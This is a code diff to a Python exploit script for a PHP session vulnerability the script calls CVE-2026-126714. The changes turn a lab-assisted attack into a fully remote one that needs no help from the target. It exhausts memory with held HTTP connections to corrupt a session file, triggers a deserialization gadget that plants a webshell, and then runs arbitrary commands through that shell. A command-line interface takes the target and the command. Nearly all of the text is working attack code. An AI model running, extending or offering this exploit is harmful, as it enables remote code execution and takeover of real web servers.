@@ -3,10 +3,12 @@
 100% remote (HTTP-only) exploit chain for CVE-2026-126714 (phpAfterShell).
 
 Everything travels over plain HTTP to the target - no docker, no cgroup
-access, no local file system access. The interrupted pwrite() is produced
-the way a real remote attacker does it: by driving the target's own
-memory-bounded cgroup (e.g. a container with mem_limit) to the edge with
-held connections while the victim request is inside its session rewrite.
+access, no local file system access, and NO help from the target: the
+bundled app exposes no diagnostic endpoint, no state dump and no helper
+route. The interrupted pwrite() is produced the way a real remote
+attacker does it: by driving the target's own memory-bounded cgroup
+(e.g. a container with mem_limit) to the edge with held connections
+while the victim request is inside its session rewrite.
 
 Chain:
   1. carrier upload-progress request (held)      -> progress record on disk
@@ -20,14 +22,21 @@ Chain:
        - inode keeps R[0:k] || C[k:]
   5. consumer GET -> session_start() promotes the planted bytes into a
      live FileCache object -> __destruct drops a webshell  -> RCE
-  6. GET /s.php?c=<command>  -> command output
+  6. GET /<random shell>?c=<command>             -> command output
 
-The interruption instant is tuned with a feedback loop driven by the
-target's oracle endpoint (which reports the splice offset k).
+All tuning runs off NATURAL signals only:
+  - the victim connection's own end (eof/rst/timeout, and when it died)
+  - PHP's "Failed to decode" warning on the consumer response
+  - the webshell probe (a per-run random shell name, so a stale shell
+    from another run can never fake a hit)
+
+The pressure is searched with a bracket that slides toward the last
+signal and then samples the band - the landing is stochastic at the
+edges (the pre-victim state jitters between attempts), so walking the
+band beats converging to a point.
 """
 from __future__ import annotations
 
-import json
 import random
 import socket
 import sys
@@ -46,9 +55,10 @@ N_FILLERS = 4
 F_MAX = 7_000_000              # per-filler field bytes (body < post_max_size)
 P_CARRIER_PROGRESS = 336       # carrier progress record length (fixed layout)
 P_START = P_CARRIER_PROGRESS + len(b"bio|s:") + len(str(lab.L1)) + len(':"')
-SHELL = lab.SHELL_URL_PATH
 H_MIN, H_MAX = 0, 28_000_000   # pressure bracket bounds (h + 4 fillers
                                # must fit below post_max_size)
+FAST_EOF_BOOTSTRAP_MS = 450.   # early/late split until this run has seen
+                               # enough deaths to calibrate its own
 
 
 # ------------------------------------------------------------------ HTTP I/O
@@ -173,55 +183,40 @@ def http_get(host: str, port: int, path: str, sid: str | None = None,
     return body
 
 
-def oracle(host: str, port: int, sid: str) -> dict:
-    body = http_get(host, port, "/index.php", sid=sid)
-    start = body.find(b"{")
-    if start < 0:
-        return {"raw": body[:300].decode(errors="replace"),
-                "dead": b"Failed to decode" not in body}
-    try:
-        rep = json.loads(body[start:])
-    except json.JSONDecodeError:
-        return {"raw": body[:300].decode(errors="replace")}
-    rep["decode_failed"] = b"Failed to decode" in body
-    return rep
+def consumer(host: str, port: int, sid: str, tries: int = 6) -> bytes:
+    """GET the consumer page with our sid - the request that makes the
+    decoder materialise the planted object and fire its gadget.
 
-
-def oracle_stable(host: str, port: int, sid: str,
-                  tries: int = 12) -> dict:
-    """Read the session report, waiting through a target restart.
-
-    The session file lives on disk and survives any process death (the
-    OOM may also select the apache master). When the target is restarting
-    at the moment we ask - or the serving child dies mid-response and we
-    get an empty body - wait and re-read instead of throwing the whole
-    attempt, and its mixed state, away.
+    The response body carries the only textual natural signal: PHP's
+    "Failed to decode" warning when the file is structurally broken.
+    Retried through a target restart (the file survives any process
+    death); an empty body means the child died mid-response.
     """
     for _ in range(tries):
         try:
-            rep = oracle(host, port, sid)
+            body = http_get(host, port, "/index.php", sid=sid)
         except OSError:
             time.sleep(0.75)
             continue
-        if rep.get("raw") == "":
-            time.sleep(0.75)      # empty body: child died mid-response
-            continue
-        return rep
-    return {"raw": "target never came back", "dead": True}
+        if body:
+            return body
+        time.sleep(0.5)
+    return b""
 
 
-def http_get_retry(host: str, port: int, path: str, sid: str | None = None,
-                   tries: int = 8) -> bytes:
-    """GET with wait-through-restart (for the webshell probe: the shell
-    file is on disk too, so a restarting target only needs a moment)."""
-    last = b""
-    for _ in range(tries):
-        try:
-            return http_get(host, port, path, sid=sid)
-        except OSError as e:
-            last = type(e).__name__.encode()
-            time.sleep(0.75)
-    return last
+def probe(host: str, port: int, cmd: str) -> bytes:
+    """Probe this run's random webshell; b'' = no shell.
+
+    None-returning transport errors are retried (the target may be
+    restarting right after the OOM); a definite 404 is final for this
+    attempt: the gadget already fired or it did not.
+    """
+    for _ in range(4):
+        body = lab.probe_shell(port, cmd)
+        if body is not None:
+            return body
+        time.sleep(0.75)
+    return b""
 
 
 # --------------------------------------------------------------- attempt
@@ -232,98 +227,25 @@ def build_payload() -> bytes:
     return lab.build_payload(P_START, e_off)
 
 
-def classify(rep: dict, c_len: int, r_len: int) -> tuple[str, int | None]:
-    if rep.get("dead"):
-        # the consumer request itself failed (often an OOM under pressure);
-        # retried after the fillers are released - not a server death.
-        return "oracle-failed", None
-    if "evil" in (rep.get("objects") or {}):
-        return "hit", rep.get("gstart")
-    size = rep.get("size", -1)
-    if size >= r_len - 64:
-        return "nooom", r_len              # pwrite completed: file = full R
-    if size > c_len:
-        return "extended", size            # k = size (overwrite not charged)
-    if size == c_len:
-        gstart, glen = rep.get("gstart"), rep.get("glen")
-        if gstart is None:
-            # no replacement filename in the file: either the untouched
-            # carrier (early OOM before the write) or k < f
-            if rep.get("flen") in (None, 4) or not rep.get("keys"):
-                return "early", 0
-            return "early-k", 0
-        if glen is not None and glen < lab.LEN2:
-            return "mix", gstart + glen
-        return "late", None                 # k >= E', file still |C|
-    gstart, glen = rep.get("gstart"), rep.get("glen")
-    if gstart is not None and glen is not None:
-        k = gstart + glen
-        if glen < lab.LEN2:
-            return "mix", k
-        return "late", k
-    return "unknown", None
-
-
 def attempt(host: str, port: int, h: int, c_len: int, r_len: int,
-            b0_ref: int | None = None,
-            anchor_hist: list[int] | None = None) -> dict:
+            cmd: str = "id") -> dict:
     """One full remote attempt with pre-loaded pressure.
 
-    h bytes of filler pressure are charged BEFORE the victim request, so the
-    used-memory curve is deterministic: the victim's own serialization
-    crosses the cgroup limit at X = limit - baseline - h. Reclaim then
-    evicts the (gc-cleared) page-cache pool - C's re-read pages - and the
-    victim's pwrite() re-charges them until the remaining headroom runs out
-    at k = limit - baseline - h - X_pwrite + evicted.
+    Every verdict inside is a NATURAL signal - the target reports
+    nothing. The attempt returns the raw observations; the driver maps
+    them to a pressure direction (it is the only side that knows this
+    run's timing distribution).
     """
-    res = {"h": h}
-    # pool hygiene: drop every stored session file so only this attempt's
-    # C contributes page cache (missing endpoint = no-op on real targets).
-    # Best-effort: a target that is restarting here is handled below.
-    try:
-        http_get(host, port, "/index.php?gc=1")
-    except OSError:
-        pass
+    res = {"h": h, "cmd": cmd}
 
     sid = lab.sid_new()
     res["sid"] = sid
 
-    # carrier with verification + retry (the progress record must exist
-    # before the bio store, otherwise the record order - and with it the
-    # whole splice geometry - is wrong).
-    carrier = None
-    for attempt_no in range(3):
-        if carrier:
-            try:
-                carrier.close()
-            except OSError:
-                pass
-        carrier, _ = lab.carrier_hold(sid)
-        time.sleep(0.7)
-        rep = oracle_stable(host, port, sid)
-        if any(str(k).startswith("upload_progress_")
-               for k in (rep.get("keys") or [])):
-            break
-    else:
-        res["outcome"] = "no-carrier"
-        try:
-            carrier.close()
-        except OSError:
-            pass
-        return res
-
-    # Live cgroup baseline from the phase-1 diagnostic report: correct the
-    # pressure for what THIS host/run actually has free before the victim
-    # starts, so the crossing lands in the same place despite inter-attempt
-    # baseline jitter (worker arena recycling moves it ~1-2MiB - enough to
-    # slide the ~2MiB window out from under a fixed pressure). Without the
-    # field (a real target) the nominal pressure is used unchanged.
-    b0 = rep.get("mem")
-    if b0:
-        res["b0"] = b0
-        if b0_ref:
-            h = max(H_MIN, min(H_MAX, h + (b0_ref - b0)))
-            res["h"] = h
+    # carrier: the progress record the victim will rewrite. There is no
+    # way to verify it over HTTP without an oracle - the timing is the
+    # same contract the local stages use (hold, then store).
+    carrier, _ = lab.carrier_hold(sid)
+    time.sleep(0.7)
 
     lab.store_bio(sid, build_payload())
     time.sleep(0.3)
@@ -334,30 +256,6 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int,
     res["pushed"] = pushed
     time.sleep(0.4)                 # let the charge settle before the victim
 
-    # Read the TRUE pre-victim state: the fillers' runtime and the session
-    # file's page cache (a term measured at ~27MiB in charge_trace - it
-    # only materializes once the fillers are open) are invisible at carrier
-    # time, and the pressure correction must cover them. Subtract our own
-    # pushed bytes so the anchor stays h-independent. Missing endpoint (a
-    # real target) = keep the carrier-phase reading.
-    try:
-        pb = http_get(host, port, "/index.php?probe=1", timeout=5)
-        m = pb.find(b"{")
-        if m >= 0:
-            d = json.loads(pb[m:])
-            anchor = int(d.get("mem", 0)) - int(d.get("self", 0)) - pushed
-            if anchor > 0:
-                # Median-smooth: the term jitters a few MiB between
-                # attempts (C's page cache comes and goes, workers
-                # differ), and an unsmoothed correction injects that
-                # jitter straight into the pressure.
-                if anchor_hist is not None:
-                    anchor_hist.append(anchor)
-                    anchor = sorted(anchor_hist)[len(anchor_hist) // 2]
-                res["b0"] = anchor
-    except (OSError, ValueError):
-        pass
-
     victim, _ = lab.replacement_hold(sid)
     ev, drop_ms, vresp = victim_wait(victim, timeout=6.0)
     res["victim"] = ev
@@ -365,11 +263,11 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int,
     if vresp:
         res["vresp"] = vresp[:80].decode(errors="replace")
 
-    # Release the pressure BEFORE reading the oracle: the consumer has to
-    # read the (up to 16 MiB) session file and must not OOM on the way.
-    # Only the fillers are released - the victim/carrier stay open, since
-    # aborting them would trigger PHP's upload-progress cleanup, which
-    # rewrites the session and destroys the mixed state.
+    # Release the pressure BEFORE reading: the consumer has to read the
+    # (up to 16 MiB) session file and must not OOM on the way. Only the
+    # fillers are released - the victim/carrier stay open, since aborting
+    # them would trigger PHP's upload-progress cleanup, which rewrites
+    # the session and destroys the mixed state.
     for s in fillers:
         try:
             s.close()
@@ -377,21 +275,17 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int,
             pass
     time.sleep(0.3)
 
-    rep = oracle_stable(host, port, sid)
-    outcome, k = classify(rep, c_len, r_len)
-    res["outcome"] = outcome
-    res["k"] = k
-    res["size"] = rep.get("size")
-    if outcome == "oracle-failed":
-        res["raw"] = str(rep.get("raw", ""))[:200]
+    # The consumer fires the gadget (if the splice materialised the
+    # object); its body may carry PHP's decode warning.
+    body = consumer(host, port, sid)
+    res["decode_failed"] = b"Failed to decode" in body
+    res["consumer_ok"] = bool(body)
 
-    hit = outcome == "hit"
-    res["hit"] = hit
-    if hit:
-        cmd_out = http_get_retry(host, port,
-                                 f"{SHELL}?c="
-                                 f"{urllib.parse.quote(res.get('cmd', 'id'))}")
-        res["output"] = cmd_out.decode(errors="replace")
+    # The only positive signal: this run's random shell.
+    out = probe(host, port, cmd)
+    res["hit"] = bool(out)
+    if out:
+        res["output"] = out.decode(errors="replace")
 
     for s in [carrier, victim]:
         try:
@@ -422,30 +316,57 @@ def wait_server(host: str, port: int, timeout: float = 20.0) -> bool:
     return False
 
 
+def _derive(res: dict, eof_times: list[float]) -> tuple[str, float]:
+    """Map natural signals to a pressure direction.
+
+      hit                 -> won (handled by the caller)
+      decode warning      -> structurally broken file: no trustworthy
+                             direction, hold the pressure
+      victim timeout      -> the write completed: the limit was never
+                             crossed -> pressure too low
+      victim died FAST    -> the OOM struck before/at the write start
+                             (early: pressure too high)
+      victim died SLOW    -> the OOM struck deeper into the rewrite
+                             (late: crossing happened, too far in)
+
+    The fast/slow split calibrates from THIS run's own death times, so
+    it does not encode any host's timing (serialisation takes ~70ms on
+    one host and ~700ms on another).
+    """
+    if res.get("decode_failed"):
+        return "noise", 0.0
+    if res.get("victim") == "timeout":
+        return "nooom", 0.0
+    if res.get("victim") in ("eof", "rst"):
+        ms = float(res.get("drop_ms") or 0.0)
+        if len(eof_times) >= 2:
+            lo, hi = min(eof_times), max(eof_times)
+            split = lo + (hi - lo) / 3 if hi > lo else FAST_EOF_BOOTSTRAP_MS
+        else:
+            split = FAST_EOF_BOOTSTRAP_MS
+        return ("early", ms) if ms <= split else ("late", ms)
+    return "noise", 0.0
+
+
 def exploit(host: str, port: int, command: str, max_attempts: int = 40,
             verbose: bool = True) -> dict:
     lab.set_geometry("big")     # victim RSS must beat the apache master
     lab.HOST, lab.PORT = host, port
+    lab.set_shell(lab.new_shell_name())   # per-run shell: no stale hits
     c_len = P_START + lab.L1 + 2
     r_len = (len(lab.r_prefix()) + lab.LEN2 + len(lab.r_suffix())
              + lab.L1 + 17)
     if verbose:
         print(f"[*] target {host}:{port}  |C|={c_len} |R|={r_len} "
               f"window=[{lab.f_offset()}, {lab.e_offset()}) "
-              f"k_target={lab.k_target()}")
+              f"k_target={lab.k_target()} shell={lab.shell_path()}")
 
     # Pre-loaded pressure H (anonymous, held in PHP's multipart parser).
-    # What must fit below the limit before the victim starts writing is
-    # B = baseline + 7 filler runtimes (~2 MiB of PHP each - real RSS the
-    # raw field bytes do not account for) + H. The OOM then has to land
-    # inside the victim's session rewrite: after serialization
-    # (B + the string must still fit) but within the first E' bytes of
-    # the pwrite. E' ~8MiB makes the landable band correspondingly wide,
-    # but the pre-victim state jitters between attempts, so H is
-    # bisected: early (OOM before the write) lowers the ceiling,
-    # late/nooom (write ran past the window) raises the floor, and once
-    # bracketed the band is sampled (the outcome is stochastic at the
-    # edges).
+    # The pre-victim state (baseline + filler runtimes + file cache)
+    # jitters between attempts, so the landable band moves: bisect it
+    # early (pressure too high) against late/nooom (too low), slide a
+    # collapsed bracket toward the last signal instead of freezing, and
+    # once narrow, SAMPLE the band - within it the landing is stochastic.
     h = 16_000_000
     h_min, h_max = H_MIN, H_MAX
     lo, hi = h_min, h_max      # bracket around the landable pressure
@@ -454,16 +375,13 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
                                # pre-victim state jitters ~1-2MiB and
                                # slides the window under a fixed h
     last_signal = None         # "early" = too high | "low" = too low
-    step = 4_000_000           # max proportional correction inside window
-
-    b0_ref = None          # first attempt's measured baseline (fresh target)
-    anchors: list[int] = [] # rolling anchor history for median smoothing
+    eof_times: list[float] = [] # this run's victim death times (calibration)
 
     for i in range(1, max_attempts + 1):
         if not wait_server(host, port):
             return {"error": "server unreachable"}
         try:
-            res = attempt(host, port, h, c_len, r_len, b0_ref, anchors)
+            res = attempt(host, port, h, c_len, r_len, command)
         except OSError as e:
             # Transient connection loss (e.g. the target is restarting after
             # an OOM): wait for it to come back and retry instead of dying.
@@ -472,28 +390,21 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
                       f"({type(e).__name__}) - waiting for target")
             wait_server(host, port, timeout=30)
             continue
-        if b0_ref is None and res.get("b0"):
-            b0_ref = res["b0"]      # anchor to the fresh target's baseline
-        res["cmd"] = command
         if res.get("hit"):
             if verbose:
                 print(f"[+] RCE on attempt {i}: "
                       f"{res.get('output', '').strip()[:200]!r}")
             return res
+
+        out, when = _derive(res, eof_times)
+        res["outcome"] = out
         if verbose:
             print(f"    attempt {i}: {res}")
 
-        out = res.get("outcome")
-        k = res.get("k")
-        sampled = False
-        if k is not None and lab.f_offset() <= k < lab.e_offset():
-            # inside the splice window: proportional correction
-            # (k = const - h, so h += (k - k_target) moves k onto target)
-            delta = k - lab.k_target()
-            delta = max(-step, min(step, delta))
-            h = max(lo, min(hi, h + delta))
-            sampled = True
-        elif out == "early" or (k is not None and k < lab.f_offset()):
+        if out == "early" or out == "late":
+            eof_times.append(when)      # feeds the fast/slow calibration
+
+        if out == "early":
             # OOM before the write: pressure too high
             hi = h
             last_signal = "early"
@@ -502,28 +413,24 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
             # pressure is too low
             lo = h
             last_signal = "low"
-        # oracle noise (oracle-failed/unknown): no signal, hold the bracket
+        # noise (decode warning, odd victim event): hold the bracket
 
-        if not sampled:
-            # A collapsed bracket must slide toward the last signal
-            # instead of freezing at one edge: inside the flip zone the
-            # SAME h reports early on one attempt and nooom on the next
-            # (baseline jitter moves the window), so point convergence
-            # stalls - see attempts 24-40 of the a83aad0-era runs.
-            if hi - lo < MIN_W:
-                if last_signal == "early":
-                    hi = min(h_max, h)
-                    lo = max(h_min, hi - MIN_W)
-                elif last_signal == "low":
-                    lo = max(h_min, h)
-                    hi = min(h_max, lo + MIN_W)
-            # coarse bisection to find the zone, then sample the band:
-            # the mix outcome is stochastic within the flip zone, so
-            # walking the band beats converging to a point
-            if hi - lo >= MIN_W * 2:
-                h = (lo + hi) // 2
-            else:
-                h = random.randint(int(lo), int(hi))
+        # A collapsed bracket must slide toward the last signal instead
+        # of freezing at one edge: inside the flip zone the SAME h can
+        # report early on one attempt and nooom on the next (the state
+        # jitters), so point convergence stalls.
+        if hi - lo < MIN_W:
+            if last_signal == "early":
+                hi = min(h_max, h)
+                lo = max(h_min, hi - MIN_W)
+            elif last_signal == "low":
+                lo = max(h_min, h)
+                hi = min(h_max, lo + MIN_W)
+        # coarse bisection to find the zone, then sample the band
+        if hi - lo >= MIN_W * 2:
+            h = (lo + hi) // 2
+        else:
+            h = random.randint(int(lo), int(hi))
 
     return {"error": "no hit within attempt budget"}
 
@@ -541,8 +448,8 @@ def main() -> int:
                    help="base URL of the target, e.g. http://127.0.0.1:8087")
     p.add_argument("--command", required=True,
                    help="shell command to run on the target")
-    p.add_argument("--attempts", type=int, default=25,
-                   help="maximum interruption attempts (default 25)")
+    p.add_argument("--attempts", type=int, default=40,
+                   help="maximum interruption attempts (default 40)")
     p.add_argument("-q", "--quiet", action="store_true")
     a = p.parse_args()
 
